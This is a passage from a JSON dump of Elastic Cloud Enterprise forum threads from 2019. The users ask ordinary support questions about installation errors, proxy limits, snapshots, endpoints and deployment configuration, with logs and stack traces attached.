[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.runAndClean(PrioritizedEsThreadPoolExecutor.java:252) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:215) [elasticsearch-7.2.0.jar:7.2.0] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?] at java.lang.Thread.run(Thread.java:834) [?:?]",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "18477b6b-8712-44b1-9c36-46838708e357",
    "url": "https://discuss.elastic.co/t/ece-install-error-with-timeout-how-to-change-the-time-with-600000-milliseconds/191123",
    "title": "ECE install error with timeout how to change the time with 600000 milliseconds",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "zqc0512",
    "date": "July 18, 2019, 4:11am July 18, 2019, 1:32pm July 28, 2019, 8:42am July 29, 2019, 3:33pm August 12, 2019, 3:33pm",
    "body": "CONSOLE: - Applying Admin Console Elasticsearch index templates {} - Unhandled error. {} -- An error has occurred in bootstrap process. Please examine logs -- java.util.concurrent.TimeoutException: Futures timed out after [600000 milliseconds] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:223) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:227) at scala.concurrent.Await$$anonfun$result$1.apply(package.scala:190) at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala:53) at scala.concurrent.Await$.result(package.scala:190) at no.found.bootstrap.BootstrapInitial.bootstrapServiceLayer(BootstrapInitial.scala:840) at no.found.bootstrap.BootstrapInitial.bootstrap(BootstrapInitial.scala:613) at no.found.bootstrap.BootstrapInitial$.delayedEndpoint$no$found$bootstrap$BootstrapInitial$1(BootstrapInitial.scala:1043) at no.found.bootstrap.BootstrapInitial$delayedInit$body.apply(BootstrapInitial.scala:1037) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35) at scala.App$class.main(App.scala:76) at no.found.util.ElasticCloudApp.main(ElasticCloudApp.scala:23) Errors have caused Elastic Cloud Enterprise installation to fail - Please check logs Node type - initial log: [2019-07-18 03:55:50,245][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [spray.can.Http$ConnectionException: ErrorClosed(Connection reset by peer)]) {} [2019-07-18 03:55:51,265][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [spray.can.Http$ConnectionException: Premature connection close (the server doesn't appear to support request pipelining)]) {} [2019-07-18 03:56:01,466][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [spray.can.Http$ConnectionException: Unexpected connection termination]) {} [2019-07-18 03:56:02,486][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [spray.can.Http$ConnectionException: Premature connection close (the server doesn't appear to support request pipelining)]) {} [2019-07-18 03:56:45,328][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [spray.can.Http$ConnectionException: ErrorClosed(Connection reset by peer)]) {} [2019-07-18 03:56:46,345][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [spray.can.Http$ConnectionException: Premature connection close (the server doesn't appear to support request pipelining)]) {} [2019-07-18 03:57:20,927][ERROR][no.found.bootstrap.BootstrapInitial$] Unhandled error. {} java.util.concurrent.TimeoutException: Futures timed out after [600000 milliseconds] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:223) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:227) at scala.concurrent.Await$$anonfun$result$1.apply(package.scala:190) at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala:53) at scala.concurrent.Await$.result(package.scala:190) at no.found.bootstrap.BootstrapInitial.bootstrapServiceLayer(BootstrapInitial.scala:840) at no.found.bootstrap.BootstrapInitial.bootstrap(BootstrapInitial.scala:613) at no.found.bootstrap.BootstrapInitial$.delayedEndpoint$no$found$bootstrap$BootstrapInitial$1(BootstrapInitial.scala:1043) at no.found.bootstrap.BootstrapInitial$delayedInit$body.apply(BootstrapInitial.scala:1037) at scala.Function0$class.apply$mcV$sp(Function0.scala:34) at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.collection.immutable.List.foreach(List.scala:392) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35) at scala.App$class.main(App.scala:76) at no.found.util.ElasticCloudApp.main(ElasticCloudApp.scala:23) at no.found.bootstrap.BootstrapInitial.main(BootstrapInitial.scala) [2019-07-18 03:57:20,998][INFO ][no.found.bootstrap.ServiceLayerBootstrap] Waiting for [apply-elasticsearch-template] to complete. Retrying every [1 second] (cause: [akka.pattern.AskTimeoutException: Recipient[Actor[akka://default/user/IO-HTTP#1589661055]] had already been terminated. Sender[null] sent the message of type \"spray.http.HttpRequest\".]) {} [2019-07-18 03:57:21,008][ERROR][scala.Predef$ ] Uncaught throwable occurred on thread: [main], calling System.exit(1) {} java.util.concurrent.TimeoutException: Futures timed out after [600000 milliseconds] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:223) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:227) at scala.concurrent.Await$$anonfun$result$1.apply(package.scala:190) at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala:53) at scala.concurrent.Await$.result(package.scala:190) at no.found.bootstrap.BootstrapInitial.bootstrapServiceLayer(BootstrapInitial.scala:840) at no.found.bootstrap.BootstrapInitial.bootstrap(BootstrapInitial.scala:613) at no.found.bootstrap.BootstrapInitial$.delayedEndpoint$no$found$bootstrap$BootstrapInitial$1(BootstrapInitial.scala:1043) at no.found.bootstrap.BootstrapInitial$delayedInit$body.apply(BootstrapInitial.scala:1037) at scala.Function0$class.apply$mcV$sp(Function0.scala:34) at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.collection.immutable.List.foreach(List.scala:392) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35) at scala.App$class.main(App.scala:76) at no.found.util.ElasticCloudApp.main(ElasticCloudApp.scala:23) at no.found.bootstrap.BootstrapInitial.main(BootstrapInitial.scala) [2019-07-18 03:57:21,010][INFO ][no.found.util.LogApplicationExit$] Application is exiting {}",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6968eebb-85fc-4d4b-9248-3b76e6122837",
    "url": "https://discuss.elastic.co/t/waiting-for-index-curation-lock/191414",
    "title": "Waiting for index curation lock",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "crickes",
    "date": "July 19, 2019, 2:53pm July 29, 2019, 3:20pm August 12, 2019, 3:20pm",
    "body": "I have deployment changes stuck in the 'Waiting for index curation lock' phase. I can that Elastic identified and fixed something in Elastic Cloud to do with this. Is there a work around to get past this phase on ECE deployments?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "265afc68-03b3-4f17-90d4-fde498c89964",
    "url": "https://discuss.elastic.co/t/haproxy-main-cannot-raise-fd-limit/192648",
    "title": "Haproxy.main: Cannot raise FD limit",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "July 29, 2019, 3:10pm July 29, 2019, 11:10am August 1, 2019, 9:52pm",
    "body": "We have only one proxy deployed (6 nodes, 3 allocators). UI became unresponsive. We can authenticate, but get no deployments listed. Via curl / API we can list all deployments etc. Searching for reason we've found the following message: ALERT] 051/133231 (106) : Cannot open configuration file/directory /app/managedd /haproxy.cfg : No such file or directory [WARNING] 051/133232 (113) : [haproxy.main()] Cannot raise FD limit to 200034, ll imit is 65536. [WARNING] 051/133232 (113) : Failed to connect to the old process socket '/app/dd ata/haproxy/haproxy.sock' [ALERT] 051/133232 (113) : Failed to get the sockets from the old process! [WARNING] 051/133232 (113) : [haproxy.main()] FD limit (65536) too low for maxcoo nn=100000/maxsock=200034. Please raise 'ulimit-n' to 200034 or more to avoid anyy trouble. [WARNING] 051/133232 (113) : Reexecuting Master process [WARNING] 051/141136 (113) : [haproxy.main()] Cannot raise FD limit to 200034, ll imit is 65536. The proxy container runs in unprivileged state, so we can't set ulimit to another value. How can we proceed? TIA, Agnes ... on the other hand the API-Call says proxy is healthy ... api/v1/platform/infrastructure/proxies \"proxies\": [{ \"public_hostname\": \"...\", \"runner_id\": \"...\", \"healthy\": true, \"proxy_id\": \"...\", \"host_ip\": \"...\", \"metadata\": { } }]",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7bbcb8e3-9313-4547-bbbe-3e4ff607891a",
    "url": "https://discuss.elastic.co/t/error-500-internal-server-error-an-internal-server-error-occurred/192662",
    "title": "Error 500 Internal Server Error: An internal server error occurred",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "apaulsen",
    "date": "July 29, 2019, 9:39am July 29, 2019, 10:56am August 1, 2019, 9:53pm",
    "body": "Error 500 Internal Server Error: An internal server error occurred I can login into elasticsearch via UI, but fetching deployments failed with \"500 Internal Server Error: An internal server error occurred\". Cannot find any errors when listing components by API calls with curl. All components show stae \"healthy: true\". Best regards, Agnes",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d100a760-1e59-491f-9ed6-9d9605d532d0",
    "url": "https://discuss.elastic.co/t/post-a-new-value-for-keystore-with-cloud/191280",
    "title": "Post a new value for keystore with Cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "seanziee",
    "date": "July 18, 2019, 9:18pm July 19, 2019, 4:51am July 19, 2019, 4:52am August 2, 2019, 4:52am",
    "body": "Hi, I'd like to add to a new keystore value for my elasticsearch on elastic cloud but because I can't get into the elastic machines to send a bin/elasticsearch-keystore command, how do I do this on a 7+ cluster? Explicitly I'm trying to add a slack hook to my watcher: https://www.elastic.co/guide/en/elastic-stack-overview/current/actions-slack.html#configuring-slack",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e7a18f5a-6c1f-4217-9be4-6e9b51f544ff",
    "url": "https://discuss.elastic.co/t/ece-reinstall-error/191119",
    "title": "ECE reinstall error",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "zqc0512",
    "date": "July 18, 2019, 3:10am July 18, 2019, 3:11am July 18, 2019, 3:19am July 18, 2019, 1:33pm August 1, 2019, 1:33pm",
    "body": "one is timeout with install and try to install with out error: [es@xxxx ECE]$ ./elastic-cloud-enterprise.sh install ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Elastic Cloud Enterprise Installer Start setting up a new Elastic Cloud Enterprise installation by installing the software on your first host. This first host becomes the initial coordinator and provides access to the Cloud UI, where you can manage your installation. To learn more about the options you can specify, see the documentation. NOTE: If you want to add this host to an existing installation, please specify the --coordinator-host and --roles-token flags ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -- Verifying Prerequisites -- Checking runner container does not exist... PASSED Checking host storage root volume path is not root... PASSED Checking host storage path is accessible... PASSED Checking host storage path contents matches whitelist... FAILED The following non-whitelisted files or directories exist within the host storage path: xxxx Remove the files or directories if you are certain they can be deleted safely, or specify a new location with the --host-storage-path parameter, and try again. Checking Docker version... PASSED Checking Docker file system... PASSED Checking Docker storage driver... PASSED Checking whether 'setuser' works inside a Docker container... PASSED Checking runner ip connectivity... PASSED Checking OS IPv4 IP forward setting... PASSED Checking OS max map count setting... PASSED Checking OS kernel version... PASSED - OS kernel version is 3.10.0-514.el7.x86_64 but we recommend 4.4. Checking minimum required memory... PASSED Checking OS kernel cgroup.memory... PASSED - OS setting 'cgroup.memory' should be set to cgroup.memory=nokmem Checking OS minimum ephemeral port... PASSED Checking OS max open file descriptors per process... PASSED Checking OS max open file descriptors system-wide... PASSED - OS setting for max open file descriptors system-wide should be >= 8217150, currently 1024000 Checking OS file system and Docker storage driver compatibility... PASSED Checking OS file system storage driver permissions... PASSED ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Errors have caused Elastic Cloud Enterprise installation to fail Some of the prerequisites failed: [host storage path contents matches whitelist], please fix before continuing ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "befef30e-3faa-4670-89e2-b8918660b08b",
    "url": "https://discuss.elastic.co/t/ece-cant-install/190848",
    "title": "ECE can't install",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "zqc0512",
    "date": "July 17, 2019, 1:30am July 17, 2019, 1:23pm July 31, 2019, 1:23pm",
    "body": "how i can do about this [elastic@localhost ECE]$ ./elastic-cloud-enterprise.sh install Unable to find image 'docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.2.3' locally docker: Error response from daemon: Get https://docker.elastic.co/v2/cloud-enterprise/elastic-cloud-enterprise/manifests/2.2.3: Get https://docker-auth.elastic.co/auth?scope=repository%3Acloud-enterprise%2Felastic-cloud-enterprise%3Apull&service=token-service: dial tcp: lookup docker-auth.elastic.co on 192.168.65.2:53: server misbehaving. See 'docker run --help'.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6c031096-786b-41c1-be2b-9f0a04fd5d76",
    "url": "https://discuss.elastic.co/t/custom-elastic-and-kibana-plugin-support/190304",
    "title": "Custom Elastic and kibana plugin support",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "robrotheram",
    "date": "July 12, 2019, 8:36pm July 12, 2019, 9:04pm July 15, 2019, 11:52am July 29, 2019, 12:04pm",
    "body": "Hello Just wondering on the status of adding custom kibana and elastic plugins are to a cluster in ece. There some documentation https://www.elastic.co/guide/en/cloud/current/ec-custom-bundles.html but that looks like the cloud version not the On Premise version",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4745b514-e0d1-4e8c-83ba-e917655f5e06",
    "url": "https://discuss.elastic.co/t/tuning-logstash-batch-sizes-to-ece-deployments/189308",
    "title": "Tuning Logstash Batch Sizes to ECE Deployments",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "crickes",
    "date": "July 8, 2019, 8:20am July 8, 2019, 1:26pm July 11, 2019, 7:51pm July 25, 2019, 7:54pm",
    "body": "I'm aware of testing batch size when trying to figure out how much data you can send a node in Elasticsearch i.e. keep increasing the batch size until the ingest rate tops out to and extrapolate, but when sending to ECE there are other factors, not just the final allocator where the data will live, to consider. When sending large amounts of data to deployment built in ECE, the data will routed through a loadbalancer, and then an ECE proxy before it hits a node in the deployment, and then perhaps is routed to another node if the data is destined for a shard on another node. In my infrastructure, I have some SSD equipped servers set to be used as hot ingest nodes in my templates, but in testing, I find that although the data eventually ends upon these allocators, we see the data hitting other nodes in the deployment first. The proxy node is obviously sending the batch request to any node in the deployment and that node is unpacking the bulk request and sending the data to the destination nodes/shards. My problem is that the other (not-hot) nodes in my deployment do not have as much RAM and so this is becoming one of the bottlenecks. Ideally, I want the the ECE proxy to send all data to the hot nodes, but the only way I have found of ensuring that, is to press the 'Stop Routing' button on all other nodes. Is there another way to ensure the data is sent only to the hot nodes? Are there any other considerations to get optimal throughput of data into an ECE deployment?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d54d0dbc-0b2f-42a5-b982-356ecd237953",
    "url": "https://discuss.elastic.co/t/ece-2-2-unable-to-upload-self-signed-certificates/189564",
    "title": "ECE 2.2 Unable to upload self-signed certificates",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Alpha_Bravo",
    "date": "July 9, 2019, 2:05pm July 9, 2019, 2:25pm July 9, 2019, 3:59pm July 17, 2019, 1:49pm July 25, 2019, 2:32pm",
    "body": "Has anyone tried uploading self-signed tls certs on ECE deployments? We are trying to use self signed certificates on our internal deployment. Continuing the discussion from ECE 2.0.1 Unable to upload Letsencrypt TLS certificate:",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2ab69977-043a-4987-b0cf-7a554655ec79",
    "url": "https://discuss.elastic.co/t/ece-c/189791",
    "title": "ECE C",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "July 10, 2019, 2:09pm July 10, 2019, 6:21pm July 24, 2019, 6:20pm",
    "body": "I can check my deployment health simply with the API, but then determining the reason for it being unhealthy is more complicated (parsing through the JSON and finding all the healthy: false occurrences) I was wondering if there is an API that would get the cause of a deployment being unhealthy? I know it appears with a reason in the UI. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f20b526c-a37e-40df-9a3b-1c71cc8b3fbb",
    "url": "https://discuss.elastic.co/t/ece-url-change/187930",
    "title": "ECE URL Change",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "daniel_a",
    "date": "June 27, 2019, 8:58pm June 28, 2019, 10:10am June 28, 2019, 4:31pm June 29, 2019, 10:28am June 30, 2019, 8:33pm July 1, 2019, 8:16am July 1, 2019, 5:11pm July 2, 2019, 1:44pm July 2, 2019, 2:16pm July 3, 2019, 6:30pm July 8, 2019, 4:29pm July 22, 2019, 4:38pm",
    "body": "I'm looking at the ECE documentation, and \"Change endpoint URLs\" section is not clear to me. https://www.elastic.co/guide/en/cloud-enterprise/current/ece-administering-endpoints.html By default, cluster and Kibana endpoint URLs are constructed according to the following pattern, where CLUSTER_ID and LOCAL_HOST_IP are values that depend on your specific installation: http://CLUSTER_ID.LOCAL_HOST_IP.ip.es.io:9200 https://CLUSTER_ID.LOCAL_HOST_IP.ip.es.io:9243 For example: http://2882c82e54d4361.us-west-5.aws.found.io:9200 https://2882c82e54d4361.us-west-5.aws.found.io:9243 How \"found.io\" URL was produced in the above example? Is just an example of another URL? Why they didn't use the same example as above (\"es.io\")? Do I need to keep es.io or found.io after I change the internal IP to a name of the hostname in AWS or GCP?",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "22ad2e4a-0c04-4488-b09c-bb9c2469f7d4",
    "url": "https://discuss.elastic.co/t/questions-on-hot-warm-deployment-runners-and-data-migration/188595",
    "title": "Questions on Hot-Warm Deployment Runners and Data Migration",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "July 3, 2019, 2:10am July 3, 2019, 1:52pm July 4, 2019, 3:31am July 11, 2019, 3:42am July 19, 2019, 3:57pm",
    "body": "I have a deployment cluster created using the Default Deployment template and considering whether to shift the data to a hot-warm deployment because there is a need to shift data based on their age. Does the Hot-Warm cluster require dedicated runners ? Is a runner able to serve as a Hot node while also hosting deployment clusters created from the default deployment template? For the Hot-Warm deployment, is it possible to shift data from the hot node to the warm node on a per document basis rather than shifting the entire index itself? Are there any migration steps to shift data from a Default Deployment to a Hot-Warm deployment? Currently, the default deployment consists of 1 index with data ranging from the past 8 years till today. The plan is to have data from the most recent 3 years to be in the Hot node while anything older than that goes into the Warm node.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "469a8693-a133-4f20-9d34-a28940cd25d6",
    "url": "https://discuss.elastic.co/t/can-a-cluster-reside-on-more-than-1-allocator/188282",
    "title": "Can a Cluster Reside on more than 1 Allocator?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "July 1, 2019, 10:15am July 1, 2019, 12:15pm July 2, 2019, 6:13am July 2, 2019, 9:22am July 2, 2019, 10:14am July 3, 2019, 1:50am July 16, 2019, 2:58pm",
    "body": "I currently have a cluster which sits on one allocator. As data grows over time, is it possible for this cluster to be scaled out horizontally over a few allocators?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "e33c81f4-9f9e-4b12-af5a-9d66fa096fa0",
    "url": "https://discuss.elastic.co/t/divide-by-zero-error-upgrading-a-deployment/186688",
    "title": "Divide by Zero Error upgrading a deployment",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
    "date": "June 20, 2019, 12:52pm July 1, 2019, 2:26pm July 15, 2019, 2:26pm",
    "body": "Hi, I'm getting the following error when upgrading a deployment (version 6.5.4 to 6.7.2 on ECE 2.2.2) Unexpected error during step: [rolling-upgrade]: [java.lang.ArithmeticException: / by zero] Any idea why this error may be occouring. When I look in the logs (logging and metrics logs) the deployment has no errors. Here's the plan I'm applying { \"tiebreaker_topology\": { \"memory_per_node\": 1024 }, \"elasticsearch\": { \"version\": \"6.7.2\", \"system_settings\": { \"use_disk_threshold\": true }, \"user_settings_yaml\": \"redacted\" }, \"transient\": { \"strategy\": { \"grow_and_shrink\": {} }, \"plan_configuration\": { \"preferred_allocators\": [], \"max_snapshot_attempts\": 3, \"move_allocators\": [], \"skip_snapshot\": false, \"move_instances\": [], \"skip_post_upgrade_steps\": false, \"extended_maintenance\": false, \"skip_upgrade_checker\": false, \"override_failsafe\": false, \"skip_data_migration\": false, \"calm_wait_time\": 5, \"reallocate_instances\": false, \"timeout\": 4096, \"max_snapshot_age\": 300, \"move_only\": false } }, \"cluster_topology\": [ { \"memory_per_node\": 1024, \"node_type\": { \"master\": true, \"data\": true, \"ingest\": false, \"ml\": false }, \"instance_configuration_id\": \"9c6147389f7d45d6b19c2e93f852cd49\", \"elasticsearch\": { \"system_settings\": { \"enable_close_index\": false, \"use_disk_threshold\": true, \"monitoring_collection_interval\": -1, \"monitoring_history_duration\": \"7d\", \"destructive_requires_name\": false, \"reindex_whitelist\": [], \"auto_create_index\": true, \"scripting\": { \"stored\": { \"enabled\": true }, \"inline\": { \"enabled\": true } }, \"http\": { \"compression\": true, \"cors_enabled\": false, \"cors_max_age\": 1728000, \"cors_allow_credentials\": false } }, \"user_settings_yaml\": \" redacted \" }, \"zone_count\": 1, \"node_count_per_zone\": 1 }, { \"size\": { \"value\": 0, \"resource\": \"memory\" }, \"node_type\": { \"master\": true, \"data\": true, \"ingest\": true, \"ml\": false }, \"instance_configuration_id\": \"data.default\", \"elasticsearch\": { \"system_settings\": { \"enable_close_index\": false, \"use_disk_threshold\": true, \"monitoring_collection_interval\": -1, \"monitoring_history_duration\": \"7d\", \"destructive_requires_name\": false, \"reindex_whitelist\": [], \"auto_create_index\": true, \"scripting\": { \"stored\": { \"enabled\": true }, \"inline\": { \"enabled\": true } }, \"http\": { \"compression\": true, \"cors_enabled\": false, \"cors_max_age\": 1728000, \"cors_allow_credentials\": false } }, \"user_settings_yaml\": \" redacted \" }, \"zone_count\": 1 }, { \"size\": { \"value\": 0, \"resource\": \"memory\" }, \"node_type\": { \"master\": true, \"data\": false, \"ingest\": false, \"ml\": false }, \"instance_configuration_id\": \"master\", \"elasticsearch\": { \"system_settings\": { \"enable_close_index\": false, \"use_disk_threshold\": true, \"monitoring_collection_interval\": -1, \"monitoring_history_duration\": \"7d\", \"destructive_requires_name\": false, \"reindex_whitelist\": [], \"auto_create_index\": true, \"scripting\": { \"stored\": { \"enabled\": true }, \"inline\": { \"enabled\": true } }, \"http\": { \"compression\": true, \"cors_enabled\": false, \"cors_max_age\": 1728000, \"cors_allow_credentials\": false } }, \"user_settings_yaml\": \" redacted \" }, \"zone_count\": 1 }, { \"size\": { \"value\": 0, \"resource\": \"memory\" }, \"node_type\": { \"master\": false, \"data\": false, \"ingest\": false, \"ml\": true }, \"instance_configuration_id\": \"ml\", \"elasticsearch\": { \"system_settings\": { \"enable_close_index\": false, \"use_disk_threshold\": true, \"monitoring_collection_interval\": -1, \"monitoring_history_duration\": \"7d\", \"destructive_requires_name\": false, \"reindex_whitelist\": [], \"auto_create_index\": true, \"scripting\": { \"stored\": { \"enabled\": true }, \"inline\": { \"enabled\": true } }, \"http\": { \"compression\": true, \"cors_enabled\": false, \"cors_max_age\": 1728000, \"cors_allow_credentials\": false } }, \"user_settings_yaml\": \" redacted \" }, \"zone_count\": 1 } ], \"deployment_template\": { \"id\": \"default\" } } Many thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c607b1c1-7a43-463f-9d81-dc1beed5a75b",
    "url": "https://discuss.elastic.co/t/an-attempt-to-enable-a-snapshot-by-api-fails/186708",
    "title": "An attempt to enable a snapshot by API fails",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "osykora",
    "date": "June 20, 2019, 2:26pm June 28, 2019, 9:45am July 12, 2019, 9:45am",
    "body": "Hi, I have an existing cluster and s3 repository created in ECE. When I want to enable snapshots for the cluster using an API call, I'm getting an error. Request: curl --request PATCH \\ --url {ece-url}/api/v1/clusters/elasticsearch/e2bf4e7e72274bd0ab8b6ba1ac7b9919/snapshot/settings \\ --header 'content-type: application/json' \\ --data '{ \"enabled\" : true, \"interval\" : \"1d\", \"pending_interval\" : \"1m\", \"repository\" : { \"reference\" : { \"repository_name\": \"cluster_repo_s3\" } }, \"retention\" : { \"max_age\" : \"90d\", \"snapshots\" : 90 } }' Response: { \"errors\": [ { \"code\": \"clusters.cluster_setting_error\", \"message\": \"Cluster Settings Error: Only one of reference/static/default repository configuration should be defined\" } ] } Any thoughts on what I'm doing wrong? Thank you, Ondrej",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9634fa23-8253-40e0-814d-6c4794b361bf",
    "url": "https://discuss.elastic.co/t/modify-deployment-endpoint-setting-using-api/186335",
    "title": "Modify Deployment Endpoint Setting using API",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "seizste",
    "date": "June 18, 2019, 6:23pm June 18, 2019, 7:55pm June 19, 2019, 10:24am July 3, 2019, 10:25am",
    "body": "Hello Everyone, is there a way to modify or set the Deployment Endpoint Setting using the API ? The setting is found in the Cloud UI below Platform > Settings > Deployment Endpoint as described here ... https://www.elastic.co/guide/en/cloud-enterprise/2.2/ece-administering-endpoints.html We're automating our ECE install using Ansible and this would be one of the last puzzle pieces to finish the initial config after installation of the different roles. Looking forward, Stefan",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1f9bf3e0-c38f-4d22-bca5-d436e4cbcc70",
    "url": "https://discuss.elastic.co/t/cluster-configuration-change-failed-not-possible-to-remove-node-attributes/186254",
    "title": "Cluster configuration change failed : not possible to remove node attributes",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "abdelbaki",
    "date": "June 18, 2019, 12:32pm June 18, 2019, 2:33pm June 18, 2019, 2:34pm July 2, 2019, 2:34pm",
    "body": "I have 3 zones and my initial cluster is : data-default in 2 zones data-highstorage in 2 zones ml in 1 zone kibana 2 zones i changed the number of zones for 'ml' nodes to 2 zones instead of 1. and by doing so i need to use dedicated master nodes in 3 zones. but i get this error and the change failed. // Cluster configuration change failed Unexpected error during step: [validate-plan-prerequisites]: [no.found.constructor.steps.PlanValidationException: It is not possible to remove node attributes [data -> hot]] I tried to create a new cluster with : data-default in 2 zones data-highstorage in 2 zones ml in 2 zones kibana 2 zones master in 3 zones and it was OK. why did the change not worked while creating a new cluster with the same configuration is succeeding ? ECE version 2.2.1 Elastic stack 7.0.0 and i'm using instance configurations tags: data:hot data:warm master:true ml:true",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e0b8c015-6c0b-42f0-93db-b82200180230",
    "url": "https://discuss.elastic.co/t/reset-elasticsearch-deployment-passsword-using-api/185691",
    "title": "Reset Elasticsearch Deployment Passsword using API",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "seizste",
    "date": "June 13, 2019, 3:36pm June 13, 2019, 4:42pm June 14, 2019, 7:47am June 28, 2019, 7:47am",
    "body": "Hello everyone, could not find it in the ece api reference, but is there a way to reset the elastic users password using the api ? Functionality should be the same as following instructions described here - https://www.elastic.co/guide/en/cloud-enterprise/current/ece-password-reset-elastic.html > Reset the password for the elastic user. Looking Forward, Stefan",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "06fdb673-aeda-465f-b077-35085fbcaa5c",
    "url": "https://discuss.elastic.co/t/ece-monitoring/185547",
    "title": "ECE Monitoring",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "NidOf3lp",
    "date": "June 13, 2019, 6:27am June 13, 2019, 5:32pm June 27, 2019, 5:32pm",
    "body": "Hi, We have an ECE installation hosting a couple of elastic clusters. We have deployed a cluster dedicated to monitoring and that was working well until the monitoring cluster went down. So now the questions I have are: How do I monitor my monitoring cluster? self-monitoring with watchers in place to warn of potential problems? Monitoring it from one of the other clusters (so basically they monitor one another)? Else? Is there a best practice approach for this case? Thanks for your help",
    "website_area": "discuss",
    "replies": 3
  },
  {
